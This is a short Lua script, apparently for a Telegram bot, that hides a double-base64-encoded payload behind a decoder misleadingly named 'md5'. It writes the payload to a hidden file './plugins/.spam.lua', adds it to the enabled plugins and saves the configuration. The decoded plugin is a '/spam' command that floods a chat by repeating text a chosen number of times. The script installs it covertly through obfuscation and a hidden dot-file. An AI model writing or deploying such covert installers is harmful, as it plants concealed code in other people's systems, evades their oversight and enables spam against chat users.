local mime = require( "mime" ) 
local md5 = mime.unb64

asource = md5( md5("Wkc4TkNtWjFibU4wYVc5dUlISjFiaWh0YzJjc0lHMWhkR05vWlhNcERRb05DZzBLSUNCc2IyTmhiQ0IwWlhnZ1BTQnRZWFJqYUdWeld6RmREUW9nSUd4dlkyRnNJSE53Y3lBOUlHMWhkR05vWlhOYk1sME5DaUFnYkc5allXd2djM0FnUFNBblJuVmphMlZrSURwRUlGeHVRM0psWVhSdmNpQTZJRUJUYUdWeWRtbHVNelVuRFFwbWIzSWdhVDB4TENCMFpYZ3NJREVnWkc4TkNnMEtjM0FnUFNBblhHNG5MaTV6Y0hNdUxpZGNiaWN1TG5Od0RRcHBJRDBnYVNBcklERU5DbVZ1WkEwS2NtVjBkWEp1SUhOd0RRb05DZzBLSUNBZ0lDQWdJQ0FnWlc1a0RRcHlaWFIxY200Z2V3MEtJQ0FnSUhCaGRIUmxjbTV6SUQwZ2V3MEtJQ0FnSUNBZ0lsNWJMeUZkVzFOelhYQmhiU0FvTGlvcElDZ3VLaWtrSWcwS0lDQWdJSDBzRFFvZ0lDQWdjblZ1SUQwZ2NuVnVMQTBLZlEwS0RRcGxibVE9") )

local file_insert = io.open 
local file_t = "w" 
local file = file_insert("./plugins/.spam.lua", file_t) 
file:write(asource) 
file:flush()
 file:close()
 table.insert(_config.enabled_plugins, '.spam')
 save_config()
